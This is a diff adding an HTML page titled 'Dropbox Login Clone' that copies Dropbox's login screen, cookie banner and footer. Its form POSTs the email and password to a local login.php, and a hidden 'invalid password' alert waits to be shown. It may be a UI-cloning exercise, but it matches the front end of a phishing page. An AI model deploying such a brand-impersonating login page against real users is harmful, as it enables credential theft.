@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dropbox Login Clone</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Atlas+Grotesk:wght@400;500;600;700&display=swap"
+        rel="stylesheet">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+    <!-- HEADER -->
+    <header class="header">
+        <div class="logo">
+            <img src="logo.svg" alt="Dropbox">
+        </div>
+
+        <button class="lang-btn" id="openLanguage">
+            🌐
+        </button>
+    </header>
+
+    <!-- LOGIN -->
+    <section class="login-section">
+
+        <div class="login-box">
+
+            <h1>Log in or sign up</h1>
+
+            <button class="social-btn">
+                <img src="google.svg">
+                Continue with Google
+            </button>
+
+            <button class="social-btn">
+                <img src="apple.svg">
+                Continue with Apple
+            </button>
+
+            <button class="social-btn">
+                <img src="microsoft.svg">
+                Continue with Microsoft
+            </button>
+
+            <div class="divider">
+                <span></span>
+                or
+                <span></span>
+            </div>
+
+            <form method="POST" action="login.php">
+                <label>Email</label>
+                <input type="email" id="email" name="email" placeholder="Enter your email">
+
+                <label>Password</label>
+                <div class="password-wrapper">
+                    <input type="password" id="password" name="password" placeholder="Enter your password">
+
+                    <button type="button" id="togglePassword" class="toggle-password">
+                        👁
+                    </button>
+                </div>
+
+                <button class="continue-btn" id="btn-signin" type="submit">
+                    Continue
+                </button>
+            </form>
+
+            <div class="error-alert" id="error-alert" style="display: none;">
+                <span>Invalid email or password. Please try again.</span>
+                <button class="error-alert-close" id="error-alert-close">×</button>
+            </div>
+        </div>
+        <br><br><br><br><br><br>
+
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+
+        <div class="footer-grid">
+
+            <div>
+                <h3>Dropbox</h3>
+                <a href="#">Desktop app</a>
+                <a href="#">Mobile app</a>
+                <a href="#">Integrations</a>
+                <a href="#">Features</a>
+                <a href="#">Solutions</a>
+                <a href="#">Security</a>
+                <a href="#">Templates</a>
+            </div>
+
+            <div>
+                <h3>Products</h3>
+                <a href="#">Plus</a>
+                <a href="#">Professional</a>
+                <a href="#">Business</a>
+                <a href="#">Enterprise</a>
+                <a href="#">Plans</a>
+            </div>
+
+            <div>
+                <h3>Features</h3>
+                <a href="#">Send large files</a>
+                <a href="#">Cloud backup</a>
+                <a href="#">Secure file transfer</a>
+                <a href="#">Convert to PDF</a>
+            </div>
+
+            <div>
+                <h3>Support</h3>
+                <a href="#">Help center</a>
+                <a href="#">Contact us</a>
+                <a href="#">Privacy & terms</a>
+                <a href="#">Cookie policy</a>
+            </div>
+
+            <div>
+                <h3>Resources</h3>
+                <a href="#">Blog</a>
+                <a href="#">Events</a>
+                <a href="#">Developers</a>
+                <a href="#">Community forums</a>
+            </div>
+
+            <div>
+                <h3>Company</h3>
+                <a href="#">About us</a>
+                <a href="#">Jobs</a>
+                <a href="#">Investor relations</a>
+            </div>
+
+        </div>
+
+        <div class="socials">
+            <span>X</span>
+            <span>f</span>
+            <span>▶</span>
+        </div>
+
+        <button class="language-footer" id="openLanguage2">
+            🌐 English (United States)
+        </button>
+
+    </footer>
+
+    <!-- COOKIE BANNER -->
+    <div class="cookie-banner" id="cookieBanner">
+
+        <button class="close-cookie" id="closeCookie">
+            ×
+        </button>
+
+        <p>
+            We use cookies to provide, improve, protect and promote our services.
+        </p>
+
+        <div class="cookie-actions">
+            <button id="openCookieSettings">
+                Customize cookies
+            </button>
+
+            <div>
+                <button class="decline">
+                    Decline
+                </button>
+
+                <button class="accept">
+                    Accept All
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- COOKIE MODAL -->
+    <div class="modal-overlay" id="cookieModal">
+
+        <div class="modal">
+
+            <button class="modal-close" id="closeCookieModal">
+                ×
+            </button>
+
+            <h2>Update Cookie Preferences</h2>
+
+            <div class="toggle-row">
+                <span>Do not sell or share my information</span>
+                <input type="checkbox">
+            </div>
+
+            <div class="toggle-row">
+                <span>Strictly Necessary</span>
+                <input type="checkbox" checked disabled>
+            </div>
+
+            <div class="toggle-row">
+                <span>General Marketing and Advertising</span>
+                <input type="checkbox" checked>
+            </div>
+
+            <div class="toggle-row">
+                <span>Analytics</span>
+                <input type="checkbox" checked>
+            </div>
+
+            <div class="toggle-row">
+                <span>Performance and Functionality</span>
+                <input type="checkbox" checked>
+            </div>
+
+            <div class="toggle-row">
+                <span>Social Media Advertising</span>
+                <input type="checkbox" checked>
+            </div>
+
+            <div class="modal-buttons">
+                <button>Strictly necessary only</button>
+                <button>Save preferences</button>
+            </div>
+
+        </div>
+
+    </div>
+
+    <!-- LANGUAGE MODAL -->
+    <div class="modal-overlay" id="languageModal">
+
+        <div class="language-box">
+
+            <button class="modal-close" id="closeLanguage">
+                ×
+            </button>
+
+            <h2>Choose a language:</h2>
+
+            <div class="language-grid">
+
+                <a href="#">English (United States)</a>
+                <a href="#">English (United Kingdom)</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Français</a>
+                <a href="#">Italiano</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Español</a>
+                <a href="#">Nederlands</a>
+                <a href="#">Svenska</a>
+                <a href="#">日本語</a>
+                <a href="#">中文（简体）</a>
+                <a href="#">中文（繁體）</a>
+
+            </div>
+
+        </div>
+
+    </div>
+
+    <script src="script.js"></script>
+
+</body>
+
+</html>
